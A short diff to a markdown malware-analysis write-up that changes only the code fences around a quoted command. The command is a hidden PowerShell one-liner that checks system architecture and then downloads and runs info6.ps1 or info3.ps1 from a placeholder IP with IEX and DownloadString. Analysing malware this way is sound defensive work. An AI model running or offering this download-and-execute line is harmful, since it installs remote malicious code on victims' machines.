@@ -14,6 +14,6 @@ In the page www.virustotal.com, 16 of 59 antivirus detect the files info6.ps1 an
 ### ANALYSIS
 The malware is downloaded from different IP addresses by means of the script identifying the type of architecture:
 
-'''
+```
 cmd /c powershell.exe -NoP -NonI -W Hidden "if((Get-WmiObject Win32_OperatingSystem).osarchitecture.contains('64')){IEX(New-Object Net.WebClient).DownloadString('http://IP /info6.ps1')}else{IEX(New-Object Net.WebClient).DownloadString('http://IP/info3.ps1')}"
-'''
+```
